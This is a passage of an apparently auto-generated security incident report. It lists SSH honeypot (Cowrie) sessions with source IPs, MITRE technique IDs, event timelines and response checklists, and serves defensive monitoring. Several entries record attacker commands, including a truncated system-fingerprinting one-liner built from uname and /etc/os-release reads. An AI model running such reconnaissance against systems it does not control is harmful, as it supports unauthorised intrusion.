- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6912ec570115

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-21 05:29 |
| **Last Seen** | 2026-08-21 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:29:36` | `cowrie.session.connect` |
| `2026-08-21 05:29:36` | `cowrie.client.version` |
| `2026-08-21 05:29:36` | `cowrie.client.kex` |
| `2026-08-21 05:29:37` | `cowrie.login.success` |
| `2026-08-21 05:29:37` | `cowrie.session.params` |
| `2026-08-21 05:29:37` | `cowrie.command.input` |
| `2026-08-21 05:29:37` | `cowrie.log.closed` |
| `2026-08-21 05:29:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c9031345dba

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-21 05:29 |
| **Last Seen** | 2026-08-21 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:29:37` | `cowrie.session.connect` |
| `2026-08-21 05:29:37` | `cowrie.client.version` |
| `2026-08-21 05:29:38` | `cowrie.client.kex` |
| `2026-08-21 05:29:38` | `cowrie.login.success` |
| `2026-08-21 05:29:39` | `cowrie.session.params` |
| `2026-08-21 05:29:39` | `cowrie.command.input` |
| `2026-08-21 05:29:39` | `cowrie.log.closed` |
| `2026-08-21 05:29:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae28f21f7bc7

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-21 05:29 |
| **Last Seen** | 2026-08-21 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:29:49` | `cowrie.session.connect` |
| `2026-08-21 05:29:49` | `cowrie.client.version` |
| `2026-08-21 05:29:49` | `cowrie.client.kex` |
| `2026-08-21 05:29:49` | `cowrie.login.success` |
| `2026-08-21 05:29:50` | `cowrie.session.params` |
| `2026-08-21 05:29:50` | `cowrie.command.input` |
| `2026-08-21 05:29:50` | `cowrie.log.closed` |
| `2026-08-21 05:29:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07224a118f6d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-21 05:29 |
| **Last Seen** | 2026-08-21 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:29:51` | `cowrie.session.connect` |
| `2026-08-21 05:29:51` | `cowrie.client.version` |
| `2026-08-21 05:29:51` | `cowrie.client.kex` |
| `2026-08-21 05:29:52` | `cowrie.login.success` |
| `2026-08-21 05:29:52` | `cowrie.session.params` |
| `2026-08-21 05:29:52` | `cowrie.command.input` |
| `2026-08-21 05:29:52` | `cowrie.log.closed` |
| `2026-08-21 05:29:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-733bf6170ad2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-21 05:29 |
| **Last Seen** | 2026-08-21 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:29:55` | `cowrie.session.connect` |
| `2026-08-21 05:29:55` | `cowrie.client.version` |
| `2026-08-21 05:29:55` | `cowrie.client.kex` |
| `2026-08-21 05:29:55` | `cowrie.login.success` |
| `2026-08-21 05:29:56` | `cowrie.session.params` |
| `2026-08-21 05:29:56` | `cowrie.command.input` |
| `2026-08-21 05:29:56` | `cowrie.log.closed` |
| `2026-08-21 05:29:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62692f3c3c79

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-21 05:30 |
| **Last Seen** | 2026-08-21 05:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:30:01` | `cowrie.session.connect` |
| `2026-08-21 05:30:01` | `cowrie.client.version` |
| `2026-08-21 05:30:01` | `cowrie.client.kex` |
| `2026-08-21 05:30:01` | `cowrie.login.success` |
| `2026-08-21 05:30:02` | `cowrie.session.params` |
| `2026-08-21 05:30:02` | `cowrie.command.input` |
| `2026-08-21 05:30:02` | `cowrie.log.closed` |
| `2026-08-21 05:30:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47cd72159bfd

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-21 05:30 |
| **Last Seen** | 2026-08-21 05:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:30:02` | `cowrie.session.connect` |
| `2026-08-21 05:30:02` | `cowrie.client.version` |
| `2026-08-21 05:30:02` | `cowrie.client.kex` |
| `2026-08-21 05:30:03` | `cowrie.login.success` |
| `2026-08-21 05:30:03` | `cowrie.session.params` |
| `2026-08-21 05:30:03` | `cowrie.command.input` |
| `2026-08-21 05:30:04` | `cowrie.log.closed` |
| `2026-08-21 05:30:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fd2bd325727

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-21 05:30 |
| **Last Seen** | 2026-08-21 05:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:30:06` | `cowrie.session.connect` |
| `2026-08-21 05:30:06` | `cowrie.client.version` |
| `2026-08-21 05:30:06` | `cowrie.client.kex` |
| `2026-08-21 05:30:06` | `cowrie.login.success` |
| `2026-08-21 05:30:07` | `cowrie.session.params` |
| `2026-08-21 05:30:07` | `cowrie.command.input` |
| `2026-08-21 05:30:07` | `cowrie.log.closed` |
| `2026-08-21 05:30:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d70f36c4d02

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-21 05:30 |
| **Last Seen** | 2026-08-21 05:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:30:07` | `cowrie.session.connect` |
| `2026-08-21 05:30:07` | `cowrie.client.version` |
| `2026-08-21 05:30:07` | `cowrie.client.kex` |
| `2026-08-21 05:30:07` | `cowrie.login.success` |
| `2026-08-21 05:30:08` | `cowrie.session.params` |
| `2026-08-21 05:30:08` | `cowrie.command.input` |
| `2026-08-21 05:30:08` | `cowrie.log.closed` |
| `2026-08-21 05:30:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e27a8221456a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-21 05:30 |
| **Last Seen** | 2026-08-21 05:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:30:08` | `cowrie.session.connect` |
| `2026-08-21 05:30:08` | `cowrie.client.version` |
| `2026-08-21 05:30:08` | `cowrie.client.kex` |
| `2026-08-21 05:30:09` | `cowrie.login.success` |
| `2026-08-21 05:30:10` | `cowrie.session.params` |
| `2026-08-21 05:30:10` | `cowrie.command.input` |
| `2026-08-21 05:30:10` | `cowrie.log.closed` |
| `2026-08-21 05:30:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-715b7b015ea5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-21 05:30 |
| **Last Seen** | 2026-08-21 05:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:30:10` | `cowrie.session.connect` |
| `2026-08-21 05:30:10` | `cowrie.client.version` |
| `2026-08-21 05:30:10` | `cowrie.client.kex` |
| `2026-08-21 05:30:10` | `cowrie.login.success` |
| `2026-08-21 05:30:11` | `cowrie.session.params` |
| `2026-08-21 05:30:11` | `cowrie.command.input` |
| `2026-08-21 05:30:11` | `cowrie.log.closed` |
| `2026-08-21 05:30:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b7913d14184

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-21 05:30 |
| **Last Seen** | 2026-08-21 05:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:30:11` | `cowrie.session.connect` |
| `2026-08-21 05:30:11` | `cowrie.client.version` |
| `2026-08-21 05:30:11` | `cowrie.client.kex` |
| `2026-08-21 05:30:11` | `cowrie.login.success` |
| `2026-08-21 05:30:12` | `cowrie.session.params` |
| `2026-08-21 05:30:12` | `cowrie.command.input` |
| `2026-08-21 05:30:12` | `cowrie.log.closed` |
| `2026-08-21 05:30:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-132c46681c09

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-21 05:30 |
| **Last Seen** | 2026-08-21 05:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:30:12` | `cowrie.session.connect` |
| `2026-08-21 05:30:12` | `cowrie.client.version` |
| `2026-08-21 05:30:12` | `cowrie.client.kex` |
| `2026-08-21 05:30:13` | `cowrie.login.success` |
| `2026-08-21 05:30:14` | `cowrie.session.params` |
| `2026-08-21 05:30:14` | `cowrie.command.input` |
| `2026-08-21 05:30:14` | `cowrie.log.closed` |
| `2026-08-21 05:30:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b83b16c88e43

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-21 05:30 |
| **Last Seen** | 2026-08-21 05:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:30:14` | `cowrie.session.connect` |
| `2026-08-21 05:30:14` | `cowrie.client.version` |
| `2026-08-21 05:30:14` | `cowrie.client.kex` |
| `2026-08-21 05:30:14` | `cowrie.login.success` |
| `2026-08-21 05:30:15` | `cowrie.session.params` |
| `2026-08-21 05:30:15` | `cowrie.command.input` |
| `2026-08-21 05:30:15` | `cowrie.log.closed` |
| `2026-08-21 05:30:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fec38af99f6c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-21 05:30 |
| **Last Seen** | 2026-08-21 05:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:30:15` | `cowrie.session.connect` |
| `2026-08-21 05:30:15` | `cowrie.client.version` |
| `2026-08-21 05:30:15` | `cowrie.client.kex` |
| `2026-08-21 05:30:15` | `cowrie.login.success` |
| `2026-08-21 05:30:16` | `cowrie.session.params` |
| `2026-08-21 05:30:16` | `cowrie.command.input` |
| `2026-08-21 05:30:16` | `cowrie.log.closed` |
| `2026-08-21 05:30:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78f7290aa635

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-21 05:30 |
| **Last Seen** | 2026-08-21 05:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:30:16` | `cowrie.session.connect` |
| `2026-08-21 05:30:16` | `cowrie.client.version` |
| `2026-08-21 05:30:16` | `cowrie.client.kex` |
| `2026-08-21 05:30:17` | `cowrie.login.success` |
| `2026-08-21 05:30:18` | `cowrie.session.params` |
| `2026-08-21 05:30:18` | `cowrie.command.input` |
| `2026-08-21 05:30:18` | `cowrie.log.closed` |
| `2026-08-21 05:30:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-482a50556ed6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-21 05:30 |
| **Last Seen** | 2026-08-21 05:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:30:18` | `cowrie.session.connect` |
| `2026-08-21 05:30:18` | `cowrie.client.version` |
| `2026-08-21 05:30:18` | `cowrie.client.kex` |
| `2026-08-21 05:30:18` | `cowrie.login.success` |
| `2026-08-21 05:30:19` | `cowrie.session.params` |
| `2026-08-21 05:30:19` | `cowrie.command.input` |
| `2026-08-21 05:30:20` | `cowrie.log.closed` |
| `2026-08-21 05:30:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec3a7e7dd92c

| Field | Detail |
|---|---|
| **Source IP** | `34.140.80[.]162` |
| **First Seen** | 2026-08-21 05:30 |
| **Last Seen** | 2026-08-21 05:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:30:19` | `cowrie.session.connect` |
| `2026-08-21 05:30:19` | `cowrie.login.success` |
| `2026-08-21 05:30:20` | `cowrie.session.params` |
| `2026-08-21 05:30:20` | `cowrie.command.input` |
| `2026-08-21 05:30:20` | `cowrie.command.input` |
| `2026-08-21 05:30:20` | `cowrie.command.failed` |
| `2026-08-21 05:30:20` | `cowrie.command.input` |
| `2026-08-21 05:30:20` | `cowrie.log.closed` |
| `2026-08-21 05:30:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.140.80[.]162` to AbuseIPDB if not already reported
- [ ] Block `34.140.80[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15196ad6586a

| Field | Detail |
|---|---|
| **Source IP** | `34.140.80[.]162` |
| **First Seen** | 2026-08-21 05:30 |
| **Last Seen** | 2026-08-21 05:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:30:33` | `cowrie.session.connect` |
| `2026-08-21 05:30:33` | `cowrie.login.success` |
| `2026-08-21 05:30:33` | `cowrie.session.params` |
| `2026-08-21 05:30:33` | `cowrie.command.input` |
| `2026-08-21 05:30:33` | `cowrie.command.failed` |
| `2026-08-21 05:30:41` | `cowrie.log.closed` |
| `2026-08-21 05:30:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.140.80[.]162` to AbuseIPDB if not already reported
- [ ] Block `34.140.80[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-341d6b0a46c5

| Field | Detail |
|---|---|
| **Source IP** | `34.140.80[.]162` |
| **First Seen** | 2026-08-21 05:30 |
| **Last Seen** | 2026-08-21 05:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:30:35` | `cowrie.session.connect` |
| `2026-08-21 05:30:35` | `cowrie.login.success` |
| `2026-08-21 05:30:35` | `cowrie.session.params` |
| `2026-08-21 05:30:35` | `cowrie.command.input` |
| `2026-08-21 05:30:41` | `cowrie.log.closed` |
| `2026-08-21 05:30:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.140.80[.]162` to AbuseIPDB if not already reported
- [ ] Block `34.140.80[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d35e08f28287

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-21 05:31 |
| **Last Seen** | 2026-08-21 05:31 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:31:20` | `cowrie.session.connect` |
| `2026-08-21 05:31:22` | `cowrie.client.version` |
| `2026-08-21 05:31:22` | `cowrie.client.kex` |
| `2026-08-21 05:31:29` | `cowrie.login.success` |
| `2026-08-21 05:31:34` | `cowrie.session.params` |
| `2026-08-21 05:31:34` | `cowrie.command.input` |
| `2026-08-21 05:31:34` | `cowrie.command.input` |
| `2026-08-21 05:31:34` | `cowrie.command.input` |
| `2026-08-21 05:31:34` | `cowrie.command.input` |
| `2026-08-21 05:31:34` | `cowrie.command.input` |
| `2026-08-21 05:31:34` | `cowrie.command.success` |
| `2026-08-21 05:31:34` | `cowrie.command.input` |
| `2026-08-21 05:31:34` | `cowrie.command.input` |
| `2026-08-21 05:31:34` | `cowrie.command.input` |
| `2026-08-21 05:31:34` | `cowrie.command.input` |
| `2026-08-21 05:31:36` | `cowrie.log.closed` |
| `2026-08-21 05:31:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70aade040b29

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-08-21 05:35 |
| **Last Seen** | 2026-08-21 05:35 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:35:16` | `cowrie.session.connect` |
| `2026-08-21 05:35:18` | `cowrie.client.version` |
| `2026-08-21 05:35:18` | `cowrie.client.kex` |
| `2026-08-21 05:35:26` | `cowrie.login.success` |
| `2026-08-21 05:35:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-027840f709a4

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-21 05:35 |
| **Last Seen** | 2026-08-21 05:35 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:35:24` | `cowrie.session.connect` |
| `2026-08-21 05:35:26` | `cowrie.client.version` |
| `2026-08-21 05:35:26` | `cowrie.client.kex` |
| `2026-08-21 05:35:33` | `cowrie.login.success` |
| `2026-08-21 05:35:36` | `cowrie.session.params` |
| `2026-08-21 05:35:36` | `cowrie.command.input` |
| `2026-08-21 05:35:36` | `cowrie.command.input` |
| `2026-08-21 05:35:36` | `cowrie.command.input` |
| `2026-08-21 05:35:36` | `cowrie.command.input` |
| `2026-08-21 05:35:36` | `cowrie.command.input` |
| `2026-08-21 05:35:36` | `cowrie.command.success` |
| `2026-08-21 05:35:36` | `cowrie.command.input` |
| `2026-08-21 05:35:36` | `cowrie.command.input` |
| `2026-08-21 05:35:36` | `cowrie.command.input` |
| `2026-08-21 05:35:36` | `cowrie.command.input` |
| `2026-08-21 05:35:37` | `cowrie.log.closed` |
| `2026-08-21 05:35:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7eec0b5b0787

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-08-21 05:35 |
| **Last Seen** | 2026-08-21 05:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
